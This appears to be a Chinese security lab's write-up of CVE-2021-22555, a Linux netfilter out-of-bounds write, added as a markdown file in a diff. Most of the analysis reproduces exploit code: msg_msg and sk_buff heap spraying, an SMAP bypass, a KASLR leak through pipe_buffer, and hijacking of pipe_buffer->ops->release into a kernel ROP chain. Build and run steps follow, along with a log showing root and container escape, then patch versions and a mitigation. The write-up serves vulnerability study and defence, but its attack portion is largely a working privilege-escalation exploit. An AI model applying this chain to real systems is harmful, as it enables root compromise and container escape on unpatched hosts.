@@ -1,0 +1,939 @@
+## **一、漏洞背景**
+
+![1629974202_61276eba1b478aa068cf0.png!small?1629974202820](https://image.3001.net/images/20210826/1629974202_61276eba1b478aa068cf0.png!small?1629974202820)
+
+##  **二、漏洞分析**
+
+程序漏洞存在与内核源码 /kernel/net/netfilter/x_tables 中的 xt_compat_target_from_user 函数中
+
+程序逻辑为构造8字节对齐缓冲区，此处 target->targetsize
+用来指定t->data实际使用长度(有可能非8字节对齐)，并将不足8字节的剩余空间清空
+
+在实际实现过程中，分配t->data缓冲区阶段，并没有考虑8字节对齐问题(直接分配实际使用大小)
+
+如果target->targetsize并非8字节对齐，此处将溢出覆盖pad字节0``
+
+> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
+>
+> unsigned int *size)
+>
+> {
+>
+> const struct xt_target *target = t->u.kernel.target;
+>
+> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
+>
+> int pad, off = xt_compat_target_offset(target);
+>
+> ...
+>
+> pad = XT_ALIGN(target->targetsize) - target->targetsize;
+>
+> if (pad > 0)
+>
+> memset(t->data + target->targetsize, 0, pad);
+>
+> ...
+>
+> }
+
+###  **2.1 利用前提知识**
+
+ **2.1.1 sendmsg堆喷**
+
+ **alloc_msg**
+
+> 内核使用alloc_msg函数为用户开辟消息缓冲区。
+
+// len为用户消息长度
+
+> static struct msg_msg *alloc_msg(size_t len)
+>
+> {
+>
+> struct msg_msg *msg;
+>
+> struct msg_msgseg **pseg;
+>
+> size_t alen;
+
+// 比较用户消息长度与DATALEN_MSG(DATALEN_MSG+sizeof(struct msg_msg) ==
+one_page_size)大小，取小值
+
+> alen = min(len, DATALEN_MSG);
+
+// 为消息队列开辟合适空间，这里相当于使用了一个可变长度数组用于存储用户数据，后面讲到msg_msg结构体会详细解释。
+
+> msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
+>
+> if (msg == NULL)
+>
+> return NULL;
+>
+> msg->next = NULL;
+>
+> msg->security = NULL;
+>
+> len -= alen;
+>
+> pseg = &msg->next;
+
+//
+在以上流程中存在一种特殊情况，即如果用户待发送消息过长，大于DATALEN_MSG，那么在这里会为msg->next开辟空间，用于存储剩余消息，不断循环，直至可以容纳全部消息。
+
+> while (len > 0) {
+>
+> struct msg_msgseg *seg;
+>
+> cond_resched();
+>
+> alen = min(len, DATALEN_SEG);
+>
+> seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
+>
+> if (seg == NULL)
+>
+> goto out_err;
+>
+> *pseg = seg;
+>
+> seg->next = NULL;
+>
+> pseg = &seg->next;
+>
+> len -= alen;
+>
+> }
+>
+> return msg;
+>
+> out_err:
+>
+> free_msg(msg);
+>
+> return NULL;
+>
+> }
+>
+> struct msg_msg
+>
+> msg_msg结构体用于管理用户消息队列
+>
+> struct msg_msg {
+>
+> /*
+>
+> struct list_head {
+>
+> struct list_head *next, *prev;
+>
+> };
+>
+> */
+
+// 指向消息队列中的另一条消息
+
+> struct list_head m_list;
+>
+> long m_type;
+>
+> size_t m_ts; /* message text size */
+
+// 如果当前msg_msg不足以容纳全部的用户消息，可以使用next链表管理用户剩余消息
+
+> struct msg_msgseg *next;
+>
+> void *security;
+>
+> /* the actual message follows immediately */
+>
+> };
+>
+> struct msg_msgseg
+>
+> msg_msgseg结构体使用next链表管理用户剩余消息
+>
+> {
+>
+> struct msg_msgseg *next;
+>
+> /* the next part of the message follows immediately */
+>
+> };
+
+如何存储用户消息
+
+从上面的msg_msg以及msg_msgseg结构体中没有发现buf变量，但是仔细研究代码会发现当msg_msg以及msg_msgseg被分配时，使用kmalloc(header_size+buf_size)，也就是说在msg_msg结构体中，除被列出的结构体成员外都是buf缓冲区空间，这样就相当于实现了一个可变数组结构，而用户消息就可以被存储在此处。
+
+ **2.1.2 pipe_bufs结构体(victim)**
+
+> struct pipe_buffer {
+>
+> struct page *page;
+>
+> unsigned int offset, len;
+>
+> const struct pipe_buf_operations *ops;
+>
+> unsigned int flags;
+>
+> unsigned long private;
+>
+> };
+>
+> struct pipe_buf_operations {
+>
+> ...
+>
+> /*
+>
+> * When the contents of this pipe buffer has been completely
+>
+> * consumed by a reader, ->release() is called.
+>
+> */
+>
+> void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
+>
+> ...
+>
+> };
+
+###  **2.2 初步利用**
+
+ **2.2.1 创建4096个消息队列**
+
+消息队列数目并没有限制，但是越多，exp稳定性会越强``
+
+> for (int i = 0; i < NUM_MSQIDS; i++) {
+>
+> if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
+>
+> perror("[-] msgget");
+>
+> goto err_no_rmid;
+>
+> }
+>
+> }
+
+`` **2.2.2 为主消息内存空间填充数据**
+
+int msgsend(int msgid, const void *msg_ptr, size_t msg_sz, int msgflg)
+
+msgid是由msgget函数返回的消息队列标识符
+
+msg_ptr是一个指向准备发送消息的指针，但是消息的数据结构却有一定的要求，指针msg_ptr所指向的消息结构需要满足{long msg_type,
+char msg_buf[]}
+
+为主消息空间填充两个标志位
+
+mtext[0] = MSG_TAG：用于标识该内存区域为堆喷控制
+
+mtext[4] = i：用于标识该内存区id，为后面识别内存区服务
+
+主消息空间大小为1024bytes，标识每个msg_msg结构体占据一个内存页，这里主要是希望得到一个整齐的空间布局，使得msg_msg结构体之间尽可能相邻
+
+在满足以上条件后将会得到以下内存布局
+
+![1629973800_61276d2825e48928ca484.png!small?1629973800294](https://image.3001.net/images/20210826/1629973800_61276d2825e48928ca484.png!small?1629973800294)
+
+> int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
+>
+> *(long *)msgp = msgtyp;
+>
+> if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
+>
+> perror("[-] msgsnd");
+>
+> return -1;
+>
+> }
+>
+> return 0;
+>
+> }
+>
+> printf("[*] Spraying primary messages...\n");
+>
+> for (int i = 0; i < NUM_MSQIDS; i++) {
+>
+> memset(&msg_primary, 0, sizeof(msg_primary));
+>
+> *(int *)&msg_primary.mtext[0] = MSG_TAG;
+>
+> *(int *)&msg_primary.mtext[4] = i;
+>
+> if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
+>
+> 0)
+>
+> goto err_rmid;
+>
+> }
+
+ **2.2.3 为辅助消息内存空间填充数据**
+
+为每个消息队列添加辅助消息(即为msg_msg->next开辟空间)
+
+添加与同消息队列中主消息相同的标识
+
+内存布局如下：
+
+![1629973830_61276d4621797cf1242d6.png!small?1629973830565](https://image.3001.net/images/20210826/1629973830_61276d4621797cf1242d6.png!small?1629973830565)
+
+> printf("[*] Spraying secondary messages...\n");
+>
+> for (int i = 0; i < NUM_MSQIDS; i++) {
+>
+> memset(&msg_secondary, 0, sizeof(msg_secondary));
+>
+> *(int *)&msg_secondary.mtext[0] = MSG_TAG;
+>
+> *(int *)&msg_secondary.mtext[4] = i;
+>
+> if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),
+>
+> MTYPE_SECONDARY) < 0)
+>
+> goto err_rmid;
+>
+> }
+
+ **2.2.4 释放部分主消息**
+
+如何释放消息：当消息被暂存时需要内核开辟缓冲区保存消息，当消息被接收后，缓冲区失去价值，会被释放。
+
+为什么释放主消息：在原内存布局中释放一些主消息，可以获得相应的4096bytes内存空洞，如果某个内存空洞被xt_table_info结构体获得，就可以利用溢出2字节0
+的特性进行下一步利用
+
+> int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
+>
+> if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
+>
+> perror("[-] msgrcv");
+>
+> return -1;
+>
+> }
+>
+> return 0;
+>
+> }
+>
+>  
+>
+>
+> printf("[*] Creating holes in primary messages...\n");
+>
+> for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {
+>
+> if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
+>
+> 0)
+>
+> goto err_rmid;
+>
+> }
+
+ **2.2.5 利用漏洞特性**
+
+使用2字节溢出将相邻的msg_msg结构体中msg_msg->list_head->next末尾两字节覆盖为0,
+使得该主消息的辅助消息指向其他主消息的辅助消息。
+
+效果：某处内存空间，被两个主消息引用
+
+内存布局如下：
+
+![1629973877_61276d750bad4edbb0cd8.png!small?1629973877194](https://image.3001.net/images/20210826/1629973877_61276d750bad4edbb0cd8.png!small?1629973877194)
+
+> printf("[*] Triggering out-of-bounds write...\n");
+>
+> if (trigger_oob_write(s) < 0)
+>
+> goto err_rmid;
+
+ **2.2.6 定位发生错误的消息队列索引**
+
+在填充消息时，为每个主消息与辅助消息填充了消息队列标识，那么这里直接查看消息内存，如果主消息与辅助消息队列标识不相同，即可断定该主消息msg_msg->list_head->next成员被修改
+
+如何保证遍历消息时，主消息与辅助消息不会被释放：接收消息时使用MSG_COPY标志
+
+> int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
+>
+> if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT)
+> <
+>
+> 0) {
+>
+> perror("[-] msgrcv");
+>
+> return -1;
+>
+> }
+>
+> return 0;
+>
+> }
+>
+> printf("[*] Searching for corrupted primary message...\n");
+>
+> for (int i = 0; i < NUM_MSQIDS; i++) {
+>
+> if (i != 0 && (i % HOLE_STEP) == 0)
+>
+> continue;
+>
+> if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)
+>
+> goto err_no_rmid;
+>
+> if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {
+>
+> printf("[-] Error could not corrupt any primary message.\n");
+>
+> goto err_no_rmid;
+>
+> }
+>
+> if (*(int *)&msg_secondary.mtext[4] != i) {
+>
+> fake_idx = i;
+>
+> real_idx = *(int *)&msg_secondary.mtext[4];
+>
+> break;
+>
+> }
+>
+> }
+>
+> if (fake_idx == -1 && real_idx == -1) {
+>
+> printf("[-] Error could not corrupt any primary message.\n");
+>
+> goto err_no_rmid;
+>
+> }
+>
+> // fake_idx's primary message has a corrupted next pointer; wrongly
+>
+> // pointing to real_idx's secondary message.
+>
+> printf("[+] fake_idx: %x\n", fake_idx);
+>
+> printf("[+] real_idx: %x\n", real_idx);
+
+2.2.7 使用可控范围更广的结构体占据msg_msg
+
+正常来说，下一步应该是使用可控范围更广的结构体(skb)与带有函数指针的结构体同时占据msg_msg，然后劫持函数指针。所以利用流程应该如下:
+
+1\. 主消息1放弃辅助消息msg_msg, skb占据msg_msg
+
+2\. 主消息2放弃辅助消息msg_msg, victim_struct占据msg_msg
+
+3\. 此时skb与victim_struct占据同一内存空间
+
+4\. 修改skb劫持victim_struct内函数指针
+
+5\. 触发victim_struct函数指针，完成流程控制
+
+但是注意到当实现步骤2时，msg_msg已经被破坏，且skb无法伪造msg_msg->list_head->next成员，如果此时主消息2释放msg_msg，辅助消息会被从循环链表msg_msg->list_head中去除，也就是说此阶段会涉及到对于msg_msg->list_head->next的读写，因为存在smap在用户态伪造该字段无意义，内核在此处会检查到smap错误，利用失败，所以接下来需要绕过SMAP
+
+###  **2.3 绕过SMAP**
+
+ **2.3.1 释放被重复引用的辅助消息**
+
+内存布局如下：
+
+![1629973925_61276da56d6fbcc1e916a.png!small?1629973925609](https://image.3001.net/images/20210826/1629973925_61276da56d6fbcc1e916a.png!small?1629973925609)
+
+> ``printf("[*] Freeing real secondary message...\n");
+>
+> if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
+>
+> MTYPE_SECONDARY) < 0)
+>
+> goto err_rmid;
+
+ **2.3.2 skb堆喷并伪造辅助消息**
+
+m_ts: 伪造辅助消息的时候需要着重关注m_ts字段，他表示消息长度
+
+内存布局如下：
+
+![1629973957_61276dc5ba866921a5cd0.png!small?1629973957923](https://image.3001.net/images/20210826/1629973957_61276dc5ba866921a5cd0.png!small?1629973957923)
+
+> void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
+>
+> uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
+>
+> msg->m_list_next = m_list_next;
+>
+> msg->m_list_prev = m_list_prev;
+>
+> msg->m_type = MTYPE_FAKE;
+>
+> msg->m_ts = m_ts;
+>
+> msg->next = next;
+>
+> msg->security = 0;
+>
+> }
+>
+> int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
+>
+> for (int i = 0; i < NUM_SOCKETS; i++) {
+>
+> for (int j = 0; j < NUM_SKBUFFS; j++) {
+>
+> if (write(ss[i][0], buf, size) < 0) {
+>
+> perror("[-] write");
+>
+> return -1;
+>
+> }
+>
+> }
+>
+> }
+>
+> return 0;
+>
+> }
+>
+> // Reclaim the previously freed secondary message with a fake msg_msg of
+>
+> // maximum possible size.
+>
+> printf("[*] Spraying fake secondary messages...\n");
+>
+> memset(secondary_buf, 0, sizeof(secondary_buf));
+>
+> build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
+>
+> PAGE_SIZE - MSG_MSG_SIZE, 0);
+>
+> if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
+>
+> goto err_rmid;
+
+####  **2.3.3 泄露相邻辅助消息- >主消息的堆地址**
+
+在skb堆喷并伪造辅助消息中发现m_ts可控，也就是说我们可以通过控制m_ts让内核将与该辅助消息相邻的辅助消息纳入消息缓冲区中，当读取该伪造辅助消息时，可以将相邻辅助消息的消息头泄露出来
+
+泄露相邻辅助的哪个成员：辅助消息的msg_msg->list_head->next指向主消息即内核堆地址，所以可以作为泄露对象。
+
+至此成功泄露相邻辅助消息->主消息的堆地址
+
+> // Use the fake secondary message to read out-of-bounds.
+>
+> printf("[*] Leaking adjacent secondary message...\n");
+>
+> if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
+>
+> goto err_rmid;
+>
+> // Check if the leak is valid.
+>
+> if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
+>
+> printf("[-] Error could not leak adjacent secondary message.\n");
+>
+> goto err_rmid;
+>
+> }
+>
+> // The secondary message contains a pointer to the primary message.
+>
+> msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
+>
+> kheap_addr = msg->m_list_next;
+>
+> if (kheap_addr & (PRIMARY_SIZE - 1))
+>
+> kheap_addr = msg->m_list_prev;
+>
+> printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
+
+ **2.3.4 泄露fake辅助消息的堆地址**
+
+以上可以获得与fake辅助消息相邻辅助消息->主消息的堆地址，将此地址填充为msg_msg->next，释放skb后，重新填充，那么此时fake辅助消息的msg_msg->next为相邻辅助消息->主消息的堆地址，内核会认为该主消息为fake辅助消息的一部分(如果msg_msg不足以容纳全部消息则为msg_msg->next开辟空间后继续容纳剩余消息)
+
+一次性读取大量fake辅助消息，内核会从msg_msg->next中继续读取消息，由此实现对于主消息头的泄露，主消息头中的msg_msg->list_head->next指向与之对应的辅助消息，即与fake辅助消息相邻的辅助消息，该内存减去1024(辅助消息结构体大小)后，得到fake辅助消息真实地址
+
+至此，获得fake辅助消息真实地址，此时再次释放skb，并将fake辅助消息真实地址填充为msg_msg->list_head->next，即可在释放此辅助消息时绕过smap``
+
+> printf("[*] Freeing fake secondary messages...\n");
+>
+> free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
+>
+> // Put kheap_addr at next to leak its content. Assumes zero bytes before
+>
+> // kheap_addr.
+>
+> printf("[*] Spraying fake secondary messages...\n");
+>
+> memset(secondary_buf, 0, sizeof(secondary_buf));
+>
+> build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
+>
+> sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);
+>
+> if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
+>
+> goto err_rmid;
+>
+> // Use the fake secondary message to read from kheap_addr.
+>
+> printf("[*] Leaking primary message...\n");
+>
+> if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
+>
+> goto err_rmid;
+>
+> // Check if the leak is valid.
+>
+> if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
+>
+> printf("[-] Error could not leak primary message.\n");
+>
+> goto err_rmid;
+>
+> }
+>
+> // The primary message contains a pointer to the secondary message.
+>
+> msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
+>
+> kheap_addr = msg->m_list_next;
+>
+> if (kheap_addr & (SECONDARY_SIZE - 1))
+>
+> kheap_addr = msg->m_list_prev;
+>
+> // Calculate the address of the fake secondary message.
+>
+> kheap_addr -= SECONDARY_SIZE;
+>
+> printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
+
+###  **2.4 绕过KASLR**
+
+pipe_buffer结构体中ops成员指向全局变量anon_pipe_buf_ops，anon_pipe_buf_ops与内核基地址偏移固定
+
+构造fake辅助消息满足msg_msg->list_head->next == msg_msg->list_head->pre == fake辅助消息
+
+直接释放fake辅助消息，使用pipefd函数分配pipe_buffer结构体结构体重新占据fake辅助消息空间
+
+此时skb仍然占据fake辅助消息空间，通过读skb泄露anon_pipe_buf_ops地址，绕过KASLR
+
+> printf("[+] STAGE 3: KASLR bypass\n");
+>
+> printf("[*] Freeing fake secondary messages...\n");
+>
+> free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
+>
+> // Put kheap_addr at m_list_next & m_list_prev so that list_del() is
+> possible.
+>
+> printf("[*] Spraying fake secondary messages...\n");
+>
+> memset(secondary_buf, 0, sizeof(secondary_buf));
+>
+> build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
+>
+> if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
+>
+> goto err_rmid;
+>
+> printf("[*] Freeing sk_buff data buffer...\n");
+>
+> if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
+>
+> goto err_rmid;
+>
+> printf("[*] Spraying pipe_buffer objects...\n");
+>
+> for (int i = 0; i < NUM_PIPEFDS; i++) {
+>
+> if (pipe(pipefd[i]) < 0) {
+>
+> perror("[-] pipe");
+>
+> goto err_rmid;
+>
+> }
+>
+> // Write something to populate pipe_buffer.
+>
+> if (write(pipefd[i][1], "pwn", 3) < 0) {
+>
+> perror("[-] write");
+>
+> goto err_rmid;
+>
+> }
+>
+> }
+>
+> printf("[*] Leaking and freeing pipe_buffer object...\n");
+>
+> for (int i = 0; i < NUM_SOCKETS; i++) {
+>
+> for (int j = 0; j < NUM_SKBUFFS; j++) {
+>
+> if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
+>
+> perror("[-] read");
+>
+> goto err_rmid;
+>
+> }
+>
+> if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
+>
+> pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
+>
+> }
+>
+> }
+>
+> kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
+>
+> printf("[+] anon_pipe_buf_ops: %" PRIx64 "\n", pipe_buffer_ops);
+>
+> printf("[+] kbase_addr: %" PRIx64 "\n", kbase_addr);
+>
+> if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {
+>
+> printf("[-] Error kernel base address is incorrect.\n");
+>
+> goto err_rmid;
+>
+> }
+>
+> printf("\n");
+
+###  **2.5 控制程序执行流程**
+
+此时skb与pipe_buffer占据同一块内存空间，重新构造skb，劫持pipe_buffer->ops至本内存空间，伪造pipe_buffer->ops->release，为第一个ROPgadget地址，实现执行流程控制``
+
+> printf("[+] STAGE 4: Kernel code execution\n");
+>
+> printf("[*] Spraying fake pipe_buffer objects...\n");
+>
+> memset(secondary_buf, 0, sizeof(secondary_buf));
+>
+> buf = (struct pipe_buffer *)&secondary_buf;
+>
+> buf->ops = kheap_addr + 0x290;
+>
+> ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
+>
+> #ifdef KERNEL_COS_5_4_89
+>
+> // RAX points to &buf->ops.
+>
+> // RCX points to &buf.
+>
+> ops->release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;
+>
+> #elif KERNEL_UBUNTU_5_8_0_48
+>
+> // RSI points to &buf.
+>
+> ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
+>
+> #endif
+>
+> build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
+>
+> if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
+>
+> goto err_rmid;
+>
+> // Trigger pipe_release().
+>
+> printf("[*] Releasing pipe_buffer objects...\n");
+>
+> for (int i = 0; i < NUM_PIPEFDS; i++) {
+>
+> if (close(pipefd[i][0]) < 0) {
+>
+> perror("[-] close");
+>
+> goto err_rmid;
+>
+> }
+>
+> if (close(pipefd[i][1]) < 0) {
+>
+> perror("[-] close");
+>
+> goto err_rmid;
+>
+> }
+>
+> }
+
+##  **三、漏洞复现**
+
+ **系统环境**
+
+ubuntu 20.04
+
+kernel 5.8.0-48
+
+### 3.1 更换系统内核为5.8.0-48-generic
+
+下载内核镜像、模块
+
+> sudo apt install linux-headers-5.8.0-48-generic\
+>
+> linux-image-5.8.0-48-generic\
+>
+> linux-modules-5.8.0-48-generic\
+>
+> linux-modules-extra-5.8.0-48-generic
+
+打开配置文件```sudo vim /etc/default/grub```
+
+修改配置```GRUB_DEFAULT=0```为
+
+> GRUB_DEFAULT="Advanced options for Ubuntu>Ubuntu, with Linux
+> 5.8.0-48-genetic"
+
+保存更新并重启系统
+
+> sudo update-grub
+>
+> sudo reboot
+
+### 3.2 编译exp
+
+gcc -m32 --static -o exp exp.c
+
+([exp下载链接](https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c))
+
+### 3.3 运行exp进行内核提权
+
+> bll@ub20:~/cve$ id
+>
+> uid=1000(bll) gid=1000(bll)
+> groups=1000(bll),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),117(docker)
+>
+> bll@ub20:~/cve$ ./exp
+>
+> [+] Linux Privilege Escalation by theflow@ - 2021
+>
+> [+] STAGE 0: Initialization
+>
+> [*] Setting up namespace sandbox...
+>
+> [*] Initializing sockets and message queues...
+>
+> [+] STAGE 1: Memory corruption
+>
+> [*] Spraying primary messages...
+>
+> [*] Spraying secondary messages...
+>
+> [*] Creating holes in primary messages...
+>
+> [*] Triggering out-of-bounds write...
+>
+> [*] Searching for corrupted primary message...
+>
+> [+] fake_idx: 803
+>
+> [+] real_idx: 7e9
+>
+> [+] STAGE 2: SMAP bypass
+>
+> [*] Freeing real secondary message...
+>
+> [*] Spraying fake secondary messages...
+>
+> [*] Leaking adjacent secondary message...
+>
+> [+] kheap_addr: ffff8b7ea8881000
+>
+> [*] Freeing fake secondary messages...
+>
+> [*] Spraying fake secondary messages...
+>
+> [*] Leaking primary message...
+>
+> [+] kheap_addr: ffff8b7ea8290000
+>
+> [+] STAGE 3: KASLR bypass
+>
+> [*] Freeing fake secondary messages...
+>
+> [*] Spraying fake secondary messages...
+>
+> [*] Freeing sk_buff data buffer...
+>
+> [*] Spraying pipe_buffer objects...
+>
+> [*] Leaking and freeing pipe_buffer object...
+>
+> [+] anon_pipe_buf_ops: ffffffff99a78380
+>
+> [+] kbase_addr: ffffffff98a00000
+>
+> [+] STAGE 4: Kernel code execution
+>
+> [*] Spraying fake pipe_buffer objects...
+>
+> [*] Releasing pipe_buffer objects...
+>
+> [*] Checking for root...
+>
+> [+] Root privileges gained.
+>
+> [+] STAGE 5: Post-exploitation
+>
+> [*] Escaping container...
+>
+> [*] Cleaning up...
+>
+> [*] Popping root shell...
+>
+> root@ub20:/# id
+>
+> uid=0(root) gid=0(root) groups=0(root)
+
+## 四、漏洞修复
+
+### 4.1 漏洞修复建议：
+
+根据官方漏洞通报，目前已在下述内核版本中对该漏洞进行了修复，用户需尽快更新内核至下述安全版本：
+
+> Linux Kernel 5.12, 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267
+
+### 4.2 临时缓解措施：
+
+用户可以先通过下述命令禁用用户命名空间来缓解该漏洞带来的影响：
+
+> echo 0 > /proc/sys/user/max_user_namespaces
+
+该漏洞的完全修复需要用户更新内核并重启系统，修复成本较高，导致利用窗口期较长，漏洞影响与危害较大。
+
+攻击者获得内核的代码执行权限后，一般会试图修改自身或指定进程的task->cred
+来提升至root用户权限，并且借助切换命名空间来逃逸容器。字节跳动安全与风控部门自研的[瑶光](https://github.com/bytedance/Elkeid/)Elkeid
+HIDS利用内核Hooking、LSM技术，可以在关键位置采集权限提升相关数据，并结合行为分析检测出异常的提权行为。同时对提权之后的一系列攻击进行兜底检测。
+
+说明：[瑶光](https://github.com/bytedance/Elkeid/)[Elkeid
+HIDS](https://github.com/bytedance/Elkeid/)是一个云原生的基于主机的安全(入侵检测与风险识别)解决方案。当前已开源，感兴趣的朋友欢迎试用：https://github.com/bytedance/Elkeid/
+
+## 五、结束语
+
+该漏洞已在Linux内核代码中存在15年，自
+linux内核v2.6.19-rc1在net/netfilter/x_tables.c中引入。攻击者可以利用该漏洞实现内核提权进而实现虚拟化逃逸，具有较大的影响与危害。无恒实验室在监测到该漏洞的披露后迅速对相关系统进行了测试和修复，同时也对漏洞利用的技术细节进行了分析，望业内人员一起学习借鉴。
+
+无恒实验室致力于为字节跳动旗下产品与业务保驾护航，亦极为重视开源软件与系统对业务安全的影响，在检测公司引入的开源框架和系统的同时，无恒实验室也着力于构建第三方框架和组件的漏洞缓解机制，并将持续与业界共享研究成果，协助企业业务避免遭受安全风险，亦望能与业内同行共同合作，为网络安全行业的发展做出贡献。
+
